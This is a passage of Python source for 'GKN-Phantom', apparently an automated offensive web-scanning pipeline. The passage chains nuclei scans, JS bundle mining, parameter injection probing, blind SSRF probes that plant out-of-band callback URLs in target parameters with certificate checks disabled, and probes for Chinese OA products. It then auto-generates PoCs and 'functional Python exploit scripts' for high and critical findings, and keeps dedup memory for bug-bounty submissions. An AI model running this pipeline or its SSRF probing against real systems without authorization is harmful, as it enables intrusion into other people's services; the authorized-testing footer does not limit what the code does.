    for u in js_urls[:max_files]:
        body = _fetch_body(u)
        if body:
            sources.append({"source": body, "url": u, "file": ""})
    if not sources:
        return [], []

    try:
        report = js_analyzer.analyze_file_list(sources)
    except Exception:
        report = {"findings": []}

    findings: list[dict] = []
    for f in report.get("findings", []):
        sev = str(f.get("severity", "low")).lower()
        findings.append({
            "type": f"js_{f.get('type', 'finding')}",
            "severity": sev,
            "tier": "high" if sev in ("high", "critical") else "low",
            "target": base,
            "probe_path": f.get("source_url") or f.get("source_file") or base,
            "probe_name": f"js_analyzer ({f.get('pattern', '?')})",
            "status": "detected",
            "confidence": 0.75,
            "evidence": {
                "request": f"GET {f.get('source_url', '')}",
                "response": str(f.get("context", ""))[:2000],
                "timestamp": utc_now_iso(),
                "tool": "js_analyzer",
                "match": str(f.get("match", ""))[:200],
                "line": f.get("line"),
            },
            "reproducible": True,
            "safe_poc": True,
            "detection_signal": f"js pattern: {f.get('pattern', '?')}",
            "auto_verifiable": True,
            "verification_method": "static_analysis",
            "requires_credentials": False,
            "requires_human_approval": False,
            "blocked_in_safe_mode": False,
        })

    entries: list[dict] = []
    seen: set[str] = set()
    for s in sources:
        try:
            for e in js_analyzer.extract_endpoint_entries(
                    s["source"], base_url=base or s["url"]):
                key = f"{e['url']}|{e['param']}"
                if key not in seen:
                    seen.add(key)
                    entries.append(e)
        except Exception:
            continue
    return findings, entries


# =============================================================================
# C5: Blind SSRF via real OOB channel (v5.4)
#
# Fire OOB-tagged callback URLs into discovered parameters (url/target/
# image/callback/...). The response body doesn't matter — the OOB channel
# seeing the callback is the evidence, which upgrades blind SSRF from
# "suspected" to validated without any destructive payload.
# =============================================================================

_SSRF_PARAMS = {
    "url", "target", "link", "image", "callback", "redirect", "next",
    "returnurl", "source", "file", "domain", "uri", "dest", "load",
    "reference", "site", "picture", "proxy", "page_url", "fetch",
}


def probe_blind_ssrf(target: str, param_entries: list[dict],
                     oob_client) -> list[dict]:
    """Fire OOB-tagged callbacks into discovered params (blind SSRF).

    Returns pending-probe descriptors; the pipeline polls the OOB channel
    after all requests are out and converts confirmed callbacks into
    validated findings.
    """
    import urllib.request
    import ssl

    pending: list[dict] = []
    base = target.rstrip("/")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for entry in param_entries[:_INJ_MAX_PARAMS]:
        if str(entry.get("param", "")).lower() not in _SSRF_PARAMS:
            continue
        tag = f"gkn-ssrf-{str(entry['param']).lower()}"
        try:
            domain = oob_client.get_domain(tag)
        except Exception:
            domain = None
        if not domain:
            continue
        url = _replace_query_param(
            entry["url"], entry["param"], f"https://{domain}/probe")
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "GKN-Phantom/5.4 OOBProbe"})
            urllib.request.urlopen(req, timeout=6, context=ctx)
        except Exception:
            pass  # blind probe: the response doesn't matter, the callback does
        pending.append({
            "tag": tag, "param": entry["param"], "url": url,
            "target": base, "callback": f"https://{domain}/probe",
        })
    return pending


def verify_oob_pending(all_findings: list[dict], oob_pending: list[dict],
                        oob_client, wait: float = 6.0) -> tuple[int, list[str]]:
    """Poll the OOB channel once and append validated blind-SSRF findings.

    Mutates all_findings (append). Returns (confirmed_count, summary_lines).
    """
    try:
        interactions = oob_client.poll(wait=wait)
    except Exception:
        interactions = []
    if not isinstance(interactions, list):
        interactions = []

    confirmed = 0
    for p in oob_pending:
        hit = next(
            (i for i in interactions
             if isinstance(i, dict) and p["tag"] in json.dumps(i, ensure_ascii=False)),
            None,
        )
        if hit is None:
            # some providers return raw strings — match those too
            hit = next(
                (i for i in interactions
                 if isinstance(i, str) and p["tag"] in i), None)
            if hit is not None:
                hit = {"raw": hit}
        if hit is None:
            continue
        confirmed += 1
        all_findings.append({
            "type": "ssrf",
            "severity": "high",
            "tier": "high",
            "target": p["target"],
            "probe_path": p["url"],
            "probe_name": f"blind ssrf ({p['param']})",
            "status": "validated",
            "confidence": 0.95,
            "evidence": {
                "request": f"GET {p['url']}",
                "response": json.dumps(hit, ensure_ascii=False)[:2000],
                "timestamp": utc_now_iso(),
                "tool": "oob_client",
                "callback_domain": p["callback"],
                "interaction": hit,
            },
            "reproducible": True,
            "safe_poc": True,
            "detection_signal": f"OOB callback observed on {p['callback']}",
            "auto_verifiable": True,
            "verification_method": "oob_callback",
            "requires_credentials": False,
            "requires_human_approval": False,
            "blocked_in_safe_mode": False,
        })
    return confirmed, interactions


# =============================================================================
# C6: Cross-run combat memory (v5.4 — SRC repeat-submission guard)
#
# SRC platforms penalize duplicate submissions (reputation loss). The
# combat memory stores fingerprints of every finding ever reported; a
# re-scan marks known findings [已提交] (submitted) / [重复] (repeat)
# so the agent only submits genuinely new issues.
# =============================================================================

_MEMORY_FILE = "combat_memory.json"


def _load_combat_memory(output_dir: str) -> dict:
    """Load {findings: [...], fingerprints: [...]} from combat_memory.json."""
    path = os.path.join(output_dir, _MEMORY_FILE)
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict) and isinstance(data.get("findings"), list):
            return data
    except Exception:
        pass
    return {"findings": [], "fingerprints": []}


def _save_combat_memory(output_dir: str, memory: dict) -> str:
    path = os.path.join(output_dir, _MEMORY_FILE)
    os.makedirs(output_dir, exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(dump_json(memory))
    return path


def apply_memory_dedup(all_findings: list[dict],
                       prior_memory: dict) -> tuple[int, int, list[dict]]:
    """Split findings into (new_count, known_count, merged_findings).

    Known findings keep their position but get marked:
      duplicate_state = "submitted" → probe_name prefixed [已提交]
      duplicate_state = "repeat"    → probe_name prefixed [重复]
    `submitted` flags on prior memory records are preserved through merges.
    """
    new, known = dedup_against_memory(all_findings, prior_memory.get("findings", []))
    for k in known:
        submitted = bool(k.get("submitted"))
        mark = "已提交" if submitted else "重复"
        k["duplicate_state"] = "submitted" if submitted else "repeat"
        k["probe_name"] = f"[{mark}] {k.get('probe_name', k.get('type', 'finding'))}"
    return len(new), len(known), new + known


def merge_combat_memory(output_dir: str, all_findings: list[dict],
                       prior_memory: dict) -> str:
    """Merge this run's findings into combat memory and save it.

    Prior records not seen this run are retained (history is never lost),
    and `submitted` flags survive re-merges."""
    merged: dict = {}
    for f in prior_memory.get("findings", []):
        fp = f.get("fingerprint") or finding_fingerprint(f)
        merged[fp] = f
    for f in all_findings:
        fp = finding_fingerprint(f)
        old = merged.get(fp) or {}
        record = {**f, "fingerprint": fp}
        if old.get("submitted"):
            record["submitted"] = True
        if old.get("state") == "known" and "duplicate_state" not in f:
            record["duplicate_state"] = old.get("duplicate_state", "repeat")
        merged[fp] = record
    memory = {
        "updated": utc_now_iso(),
        "fingerprints": list(merged.keys()),
        "findings": list(merged.values()),
    }
    return _save_combat_memory(output_dir, memory)


# =============================================================================
# Main Pipeline
# =============================================================================

def run_combat_pipeline(
    targets: list[str],
    tech_data: dict | None = None,
    output_dir: str = "./combat_output",
    use_nuclei: bool = True,
    quick_probes: bool = True,
    severity_filter: list[str] | None = None,
    rate_limit: int = 150,
    concurrency: int = 25,
    poc_formats: list[str] | None = None,
    deep: bool = True,
    oob_client=None,
    use_cn_probes: bool = True,
    use_crawl: bool = True,
    use_js: bool = True,
    use_memory: bool = True,
) -> dict:
    """Run the full detect → deep-dive → PoC → exploit combat pipeline.

    `deep=True` enables the layered extensions:
      v5.3 — deep-dive adapters (Phase 2.5), param discovery + bounded
             SQLi/SSTI injection probing (Phase 2.6)
      v5.4 — CN component probes (Phase 2.55), katana full-site crawl
             feeding param probes (C3), JS bundle mining via js_analyzer
             with hidden-endpoint chaining (C4), real OOB blind-SSRF
             validation (C5), cross-run dedup memory (C6).

    Every v5.4 layer degrades to a no-op when its dependency is missing
    (no katana / no OOB provider / no JS files) — zero overhead, never
    blocks the pipeline. Returns a summary dict with artifact paths.
    """
    if poc_formats is None:
        poc_formats = ["curl", "python", "raw_http"]

    ts_dir = datetime.now(timezone.utc).strftime("combat_%Y%m%d_%H%M%SZ")
    output_path = os.path.join(output_dir, ts_dir)
    os.makedirs(output_path, exist_ok=True)

    sev_filter = severity_filter or ["critical", "high", "medium"]
    all_findings: list[dict] = []
    summary_parts: list[str] = []
    katana_ok = False  # set by Phase 2.6; referenced in the manifest

    # ------------------------------------------------------------------
    # Phase 1: Nuclei scan
    # ------------------------------------------------------------------
    if use_nuclei:
        nuclei_ok, npath, nversion = nuclei_runner.detect_nuclei()
        if nuclei_ok:
            summary_parts.append(f"Nuclei {nversion} available at {npath}")
            tdir = nuclei_runner._get_default_templates_dir()
            templates = nuclei_runner.scan_templates(
                templates_dir=tdir, severity_filter=sev_filter,
            )
            if tech_data:
                templates = nuclei_runner.select_templates_by_tech(
                    templates, tech_data,
                )
            # Scope-limit: cap to DEFAULT_MAX_TEMPLATES
            removed = 0
            if len(templates) > nuclei_runner.DEFAULT_MAX_TEMPLATES:
                removed = len(templates) - nuclei_runner.DEFAULT_MAX_TEMPLATES
                templates = templates[:nuclei_runner.DEFAULT_MAX_TEMPLATES]
                summary_parts.append(
                    f"Scope-limited: {removed} templates removed "
                    f"({nuclei_runner.DEFAULT_MAX_TEMPLATES} kept)"
                )
            plan = nuclei_runner.generate_execution_plan(
                templates=templates,
                targets=targets,
                rate_limit=rate_limit,
                concurrency=concurrency,
                severity_filter=sev_filter,
            )
            summary_parts.append(
                f"Nuclei plan: {plan.template_count} templates × "
                f"{plan.target_count} targets ≈ {_human(plan.estimated_time_seconds)}"
            )
            # Execute nuclei (if available)
            try:
                proc = subprocess.run(
                    plan.commands[0] if plan.commands else "echo 'no commands'",
                    shell=True, capture_output=True, text=True, timeout=plan.estimated_time_seconds + 60,
                )
                nuclei_findings = [
                    f.to_dict() for f in nuclei_runner.parse_nuclei_output(proc.stdout)
                ]
                deduped = nuclei_runner.deduplicate_findings(
                    nuclei_runner.parse_nuclei_output(proc.stdout)
                )
                all_findings.extend([f.to_dict() for f in deduped])
                summary_parts.append(f"Nuclei: {len(deduped)} findings (deduped)")
            except subprocess.TimeoutExpired:
                summary_parts.append("Nuclei: timed out (scope limit applied)")
            except Exception as e:
                summary_parts.append(f"Nuclei: execution error — {e}")
        else:
            summary_parts.append("Nuclei not installed — skip")
            plan = nuclei_runner.generate_execution_plan(
                templates=[], targets=targets,
                rate_limit=rate_limit, concurrency=concurrency,
                severity_filter=sev_filter,
            )
            if plan.warnings:
                summary_parts.extend(plan.warnings[:2])

    # ------------------------------------------------------------------
    # Phase 2: Quick built-in probes (OOB domain injected when available)
    # ------------------------------------------------------------------
    if quick_probes:
        qp_findings = run_quick_probes(targets, oob_client)
        if qp_findings:
            all_findings.extend(qp_findings)
            summary_parts.append(f"Quick probes: {len(qp_findings)} findings")

    # ------------------------------------------------------------------
    # Phase 2.55 (v5.4): CN component probes — domestic OA/component
    # unauthorized-access library (weaver/seeyon/tongda/yonyou/zentao/
    # jeecg-boot/ruoyi/finereport/...). Nuclei templates barely cover these.
    # ------------------------------------------------------------------
    if deep and use_cn_probes:
        try:
            import cn_probes
            cn_findings = cn_probes.probe_cn_components(targets)
        except Exception as e:
            cn_findings = []
            summary_parts.append(f"CN component probes: skipped ({e})")
        if cn_findings:
            all_findings.extend(cn_findings)
            by_comp: dict[str, int] = {}
            for cf in cn_findings:
                comp = str(cf.get("probe_name", "?")).split("(")[0].strip()
                by_comp[comp] = by_comp.get(comp, 0) + 1
            summary_parts.append(
                "CN component probes: "
                + ", ".join(f"{k}×{v}" for k, v in sorted(by_comp.items()))
            )

    # ------------------------------------------------------------------
    # Phase 2.5 (v5.3 C1): Deep-dive adapters on detected quick-probe
    # findings — fetch exposed content, prove impact, escalate severity.
    # Zero overhead when no quick probe hit.
    # ------------------------------------------------------------------
    if deep and quick_probes:
        dd_count = 0
        for f in list(all_findings):
            if f.get("status") == "detected" and "probe_path" in f:
                before = f.get("severity")
                deep_dive(f)
                dd = f.get("deep_dive") or {}
                if dd.get("performed"):
                    dd_count += 1
                    if f.get("severity") != before:
                        summary_parts.append(
                            f"Deep dive escalated {f.get('type')} "
                            f"({before} → {f.get('severity')})"
                        )
        if dd_count:
            summary_parts.append(
                f"Deep dive: {dd_count} findings impact-verified"
            )

    # ------------------------------------------------------------------
    # Phase 2.6 (v5.3 C2 + v5.4 C3/C4): Parameter discovery + bounded
    # injection probing. URL sources stack up:
    #   entry page → katana full-site crawl (when installed) → hidden
    #   endpoints mined from JS bundles (js_analyzer). Blind SSRF probes
    #   (OOB) are fired alongside for channel-verified detection.
    # ------------------------------------------------------------------
    oob_pending: list[dict] = []
    if deep:
        katana_ok, kpath, kver = (False, None, None)
        if use_crawl:
            katana_ok, kpath, kver = detect_katana()
            if katana_ok:
                summary_parts.append(
                    f"katana {kver} available — full-site crawl enabled")
        param_findings: list[dict] = []
        js_findings: list[dict] = []
        for t in targets:
            extra_urls: list[str] = []
            js_urls: list[str] = []
            # C3: full-site crawl (fallback: entry page only)
            if katana_ok and kpath:
                try:
                    cr = crawl_katana(t, kpath)
                except Exception:
                    cr = {"urls": [], "js_urls": [], "count": 0}
                extra_urls = cr.get("urls", [])
                js_urls = list(cr.get("js_urls", []))
                if cr.get("count"):
                    summary_parts.append(
                        f"katana crawl {t}: {len(extra_urls)} pages, "
                        f"{len(js_urls)} JS files")
            # C4: entry-page <script src> as the no-katana JS source
            if use_js:
                for u in collect_js_urls(t):
                    if u not in js_urls:
                        js_urls.append(u)
            try:
                entries = discover_params(t, extra_urls=extra_urls)
            except Exception:
                entries = []
            # C4: JS bundle mining — findings + hidden endpoints
            if use_js and js_urls:
                try:
                    jf, je = analyze_target_js(js_urls, t.rstrip("/"))
                except Exception:
                    jf, je = [], []
                if jf:
                    js_findings.extend(jf)
                if je:
                    seen_e = {(e["url"], e["param"]) for e in entries}
                    entries += [e for e in je
                                if (e["url"], e["param"]) not in seen_e]
            if entries:
                param_findings.extend(probe_injection(t, entries))
                # C5: blind SSRF via real OOB channel
                if oob_client is not None:
                    try:
                        oob_pending.extend(
                            probe_blind_ssrf(t, entries, oob_client))
                    except Exception:
                        pass
        if js_findings:
            all_findings.extend(js_findings)
            summary_parts.append(
                f"JS analysis: {len(js_findings)} findings "
                "(/secrets/sinks/hidden endpoints from JS bundles)")
        if param_findings:
            all_findings.extend(param_findings)
            by_type = {}
            for pf in param_findings:
                by_type[pf["type"]] = by_type.get(pf["type"], 0) + 1
            summary_parts.append(
                "Param probes: "
                + ", ".join(f"{k}×{v}" for k, v in sorted(by_type.items()))
            )

    # ------------------------------------------------------------------
    # Phase 3: Assign IDs, sort, dedup
    # ------------------------------------------------------------------
    # C5 (cont.): before IDs are assigned, poll the OOB channel once and
    # convert confirmed callbacks into validated blind-SSRF findings.
    if oob_client is not None and oob_pending:
        confirmed, _ = verify_oob_pending(all_findings, oob_pending, oob_client)
        if confirmed:
            summary_parts.append(
                f"OOB verification: {confirmed} blind SSRF callbacks "
                "confirmed (validated)")
        else:
            summary_parts.append(
                f"OOB verification: 0 callbacks from {len(oob_pending)} "
                "blind probes")
    for i, f in enumerate(all_findings, 1):
        f["id"] = f.get("id", "") or f"combat-{i:04d}"
        f["severity"] = f.get("severity", "low").lower()
        # v5.2: content-aware escalation (no-op for findings without probe_path)
        escalate_severity(f)

    # Simple dedup by type+target
    seen: set = set()
    deduped_all: list[dict] = []
    for f in all_findings:
        key = f"{f.get('type','')}|{f.get('target','')}|{f.get('probe_path','')}"
        if key not in seen:
            seen.add(key)
            deduped_all.append(f)

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    deduped_all.sort(key=lambda x: sev_order.get(x.get("severity", "low"), 5))
    all_findings = deduped_all

    # ------------------------------------------------------------------
    # Phase 3.5 (v5.4 C6): cross-run dedup against combat memory.
    # SRC platforms penalize duplicate submissions — known findings are
    # marked [已提交]/[重复] instead of silently re-reported, and this
    # run's fingerprints are merged back into the memory file.
    # ------------------------------------------------------------------
    memory_path = os.path.join(output_dir, _MEMORY_FILE)
    if use_memory:
        try:
            prior_memory = _load_combat_memory(output_dir)
            n_new, n_known, all_findings = apply_memory_dedup(
                all_findings, prior_memory)
            if n_known:
                summary_parts.append(
                    f"Memory dedup: {n_new} new, {n_known} known "
                    "(marked [已提交]/[重复] — do not resubmit)")
            merge_combat_memory(output_dir, all_findings, prior_memory)
        except Exception as e:
            summary_parts.append(f"Memory dedup: skipped ({e})")

    summary_parts.append(f"Total findings: {len(all_findings)}")

    # Save findings JSON
    findings_path = os.path.join(output_path, "findings.json")
    with open(findings_path, "w", encoding="utf-8") as fh:
        fh.write(dump_json(all_findings))

    # ------------------------------------------------------------------
    # Phase 4: PoC generation
    # ------------------------------------------------------------------
    poc_dir = os.path.join(output_path, "pocs")
    poc_result = poc_generator.generate_poc_batch(all_findings, poc_formats, poc_dir)
    summary_parts.append(
        f"PoCs: {poc_result.get('generated', 0)} generated → {poc_dir}"
    )

    # ------------------------------------------------------------------
    # Phase 5: Exploit generation (high + critical only)
    # ------------------------------------------------------------------
    exp_dir = os.path.join(output_path, "exploits")
    exp_result = exploit_generator.generate_exploit_batch(all_findings, exp_dir)
    summary_parts.append(
        f"Exploits: {exp_result['generated']} generated → {exp_dir}"
    )

    # ------------------------------------------------------------------
    # Phase 6: Combat index
    # ------------------------------------------------------------------
    index_path = _write_combat_index(output_path, all_findings, summary_parts)

    # ------------------------------------------------------------------
    # Phase 7: Manifest
    # ------------------------------------------------------------------
    manifest = {
        "pipeline_version": "5.4.0",
        "timestamp": utc_now_iso(),
        "targets": targets,
        "target_count": len(targets),
        "total_findings": len(all_findings),
        "by_severity": {
            sev: sum(1 for f in all_findings if f.get("severity") == sev)
            for sev in ["critical", "high", "medium", "low"]
        },
        "duplicate_known": sum(
            1 for f in all_findings if f.get("duplicate_state")),
        "layers": {
            "cn_probes": bool(use_cn_probes),
            "katana_crawl": use_crawl and bool(katana_ok),
            "js_mining": bool(use_js),
            "oob_provider": getattr(oob_client, "provider", None),
            "memory_dedup": bool(use_memory),
        },
        "artifacts": {
            "findings": findings_path,
            "pocs": poc_dir,
            "exploits": exp_dir,
            "index": index_path,
            "combat_memory": memory_path,
        },
        "summary": summary_parts,
    }
    manifest_path = os.path.join(output_path, "manifest.json")
    with open(manifest_path, "w", encoding="utf-8") as fh:
        fh.write(dump_json(manifest))

    # Release the OOB channel (interactsh subprocess etc.)
    if oob_client is not None:
        try:
            oob_client.close()
        except Exception:
            pass

    return {
        "output_dir": os.path.abspath(output_path),
        **manifest,
    }


def _write_combat_index(output_dir: str, findings: list[dict], summary: list[str]) -> str:
    """Generate a simple index HTML with all findings + links."""
    sev_colors = {
        "critical": "#dc2626", "high": "#ea580c",
        "medium": "#ca8a04", "low": "#2563eb",
    }
    by_type: dict[str, list] = {}
    for f in findings:
        t = f.get("type", "unknown")
        by_type.setdefault(t, []).append(f)

    type_rows = ""
    for t, items in sorted(by_type.items()):
        severity = items[0].get("severity", "low")
        color = sev_colors.get(severity, "#6b7280")
        type_rows += f"""
        <tr>
          <td style="color:{color};font-weight:bold">{t}</td>
          <td>{len(items)}</td>
          <td><span style="background:{color};color:#fff;padding:2px 8px;border-radius:4px;font-size:12px">{severity}</span></td>
          <td>{items[0].get('target','?')[:60]}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>GKN-Phantom Combat Report</title>
<style>
  body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px}}
  h1{{color:#38bdf8}} h2{{color:#94a3b8;border-bottom:1px solid #334155;padding-bottom:8px}}
  table{{width:100%;border-collapse:collapse;margin:16px 0}}
  th,td{{padding:10px 14px;text-align:left;border-bottom:1px solid #1e293b}}
  th{{background:#1e293b;color:#94a3b8}}
  .summary{{background:#1e293b;padding:16px;border-radius:8px;margin:16px 0}}
  .summary li{{margin:4px 0;color:#94a3b8}}
  .artifact{{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px;margin:8px 0}}
  a{{color:#38bdf8}}
  .tag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:12px;margin:2px}}
</style></head>
<body>
<h1>⚔ GKN-Phantom Combat Report</h1>
<p style="color:#64748b">{utc_now_iso()}</p>

<h2>Summary</h2>
<div class="summary">
<ul>{"".join(f"<li>{s}</li>" for s in summary)}</ul>
</div>

<h2>Findings by Type ({len(findings)} total)</h2>
<table>
<tr><th>Type</th><th>Count</th><th>Severity</th><th>Sample Target</th></tr>
{type_rows}
</table>

<h2>Artifacts</h2>
<div class="artifact">
  <strong>Findings JSON:</strong>
  <a href="findings.json">findings.json</a>
  — all findings in structured JSON format
</div>
<div class="artifact">
  <strong>PoC Scripts:</strong>
  <a href="pocs/">pocs/</a>
  — curl commands, Python scripts, raw HTTP for each finding
</div>
<div class="artifact">
  <strong>Exploit Scripts:</strong>
  <a href="exploits/">exploits/</a>
  — functional Python exploit scripts (high + critical)
</div>
<div class="artifact">
  <strong>Manifest:</strong>
  <a href="manifest.json">manifest.json</a>
  — full pipeline manifest
</div>

<p style="color:#64748b;font-size:12px;margin-top:32px">
  ⚠ AUTHORIZED SECURITY TESTING ONLY. Generated by GKN-Phantom v5.1.
</p>
</body></html>"""

    path = os.path.join(output_dir, "index.html")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)
    return os.path.abspath(path)


def _human(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m {seconds % 60}s"
    return f"{seconds // 3600}h {(seconds % 3600) // 60}m"


def _load_targets(source: str) -> list[str]:
    """Load targets from JSON file, text file (one per line), or comma-separated."""
    if not source:
        return []
    # Try JSON
    try:
        data = load_json(source)
        if isinstance(data, list):
            return [str(t) for t in data if t]
        if isinstance(data, dict):
            for key in ("targets", "urls", "hosts", "domains"):
                if key in data:
                    return [str(t) for t in data[key] if t]
    except Exception:
        pass
    # Try as comma-separated
    if "," in source and not os.path.isfile(source):
        return [t.strip() for t in source.split(",") if t.strip()]
    # Try as file (one per line)
    try:
        with open(source, "r", encoding="utf-8") as fh:
            return [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    except Exception:
        pass
    return [source]


# =============================================================================
# CLI
# =============================================================================

def main() -> int:
    ap = argparse.ArgumentParser(description="GKN-Phantom Quick Combat Pipeline v5.4")
    ap.add_argument("--targets", required=True,
                    help="Targets: JSON file, comma-separated URLs, or text file (one per line)")
    ap.add_argument("--tech", help="Technology fingerprint JSON (from tech_fingerprint.py)")
    ap.add_argument("--output-dir", default="./combat_output",
                    help="Output directory (default: ./combat_output)")
    ap.add_argument("--severity", default="critical,high,medium",
                    help="Severity filter (default: critical,high,medium)")
    ap.add_argument("--no-nuclei", action="store_true",
                    help="Skip nuclei scan (use only quick built-in probes)")
    ap.add_argument("--no-quick-probes", action="store_true",
                    help="Skip built-in quick probes")
    ap.add_argument("--no-deep", action="store_true",
                    help="Disable deep layers (deep-dive adapters + "
                         "parameter/injection probing + CN/JS/crawl layers)")
    ap.add_argument("--no-cn-probes", action="store_true",
                    help="Skip domestic OA/component probes (weaver/seeyon/"
                         "tongda/jeecg-boot/ruoyi/...)")
    ap.add_argument("--no-crawl", action="store_true",
                    help="Skip katana full-site crawl (entry page only)")
    ap.add_argument("--no-js", action="store_true",
                    help="Skip JS bundle analysis (js_analyzer)")
    ap.add_argument("--no-memory", action="store_true",
                    help="Skip cross-run dedup memory (combat_memory.json)")
    ap.add_argument("--oob-provider", default="auto",
                    choices=["auto", "interactsh", "ceye", "dnslog", "none"],
                    help="OOB channel provider (default: auto = interactsh "
                         "binary in PATH, else ceye env vars)")
    ap.add_argument("--ceye-identifier", default=None,
                    help="ceye.io identifier (or GKN_CEYE_IDENTIFIER env)")
    ap.add_argument("--ceye-token", default=None,
                    help="ceye.io API token (or GKN_CEYE_TOKEN env)")
    ap.add_argument("--interactsh-server", default=None,
                    help="Self-hosted interactsh server URL (or GKN_INTERACTSH_SERVER)")
    ap.add_argument("--rate-limit", type=int, default=150,
                    help="Nuclei rate limit (default: 150)")
    ap.add_argument("--concurrency", type=int, default=25,
                    help="Nuclei concurrency (default: 25)")
    ap.add_argument("--poc-formats", default="curl,python,raw_http",
                    help="PoC output formats (default: curl,python,raw_http)")
    args = ap.parse_args()

    targets = _load_targets(args.targets)
    if not targets:
        print("[!] No targets loaded", file=sys.stderr)
        return 2

    severity_filter = [
        s.strip().lower() for s in args.severity.split(",") if s.strip()
    ]

    tech_data = None
    if args.tech:
        try:
            tech_data = load_json(args.tech)
        except Exception:
            print(f"[!] Cannot load tech data from {args.tech}", file=sys.stderr)

    poc_formats = [
        f.strip() for f in args.poc_formats.split(",") if f.strip()
    ]

    # OOB channel (best-effort: degrades to None, never blocks)
    oob_client = None
    if args.oob_provider != "none":
        try:
            import oob_client as oob_mod
            oob_client = oob_mod.get_oob_client(
                provider=args.oob_provider,
                ceye_identifier=args.ceye_identifier,
                ceye_token=args.ceye_token,
                interactsh_server=args.interactsh_server,
            )
        except Exception:
            oob_client = None

    print(f"\n{'='*60}")
    print(f"GKN-Phantom Quick Combat Pipeline v5.4")
    print(f"Targets: {len(targets)} | Severity: {', '.join(severity_filter)}")
    print(f"Nuclei: {'ON' if not args.no_nuclei else 'OFF'} | "
          f"Quick probes: {'ON' if not args.no_quick_probes else 'OFF'} | "
          f"Deep: {'ON' if not args.no_deep else 'OFF'}")
    print(f"CN probes: {'ON' if not args.no_cn_probes else 'OFF'} | "
          f"Crawl: {'ON' if not args.no_crawl else 'OFF'} | "
          f"JS: {'ON' if not args.no_js else 'OFF'} | "
          f"Memory: {'ON' if not args.no_memory else 'OFF'}")
    print(f"OOB channel: {getattr(oob_client, 'provider', 'OFF')}")
    print(f"{'='*60}\n")

    t0 = time.monotonic()
    try:
        result = run_combat_pipeline(
            targets=targets,
            tech_data=tech_data,
            output_dir=args.output_dir,
            use_nuclei=not args.no_nuclei,
            quick_probes=not args.no_quick_probes,
            severity_filter=severity_filter,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            poc_formats=poc_formats,
            deep=not args.no_deep,
            oob_client=oob_client,
            use_cn_probes=not args.no_cn_probes,
            use_crawl=not args.no_crawl,
            use_js=not args.no_js,
            use_memory=not args.no_memory,
        )
    except Exception as e:
        print(f"\n[!] Pipeline failed: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1

    elapsed = time.monotonic() - t0
    print(f"\n{'='*60}")
    for s in result["summary"]:
        print(f"  {s}")
    print(f"  Duration: {_human(int(elapsed))}")
    print(f"{'='*60}")
    print(f"\n[+] Output: {result['output_dir']}")
    print(f"[+] Index:  {result['artifacts']['index']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
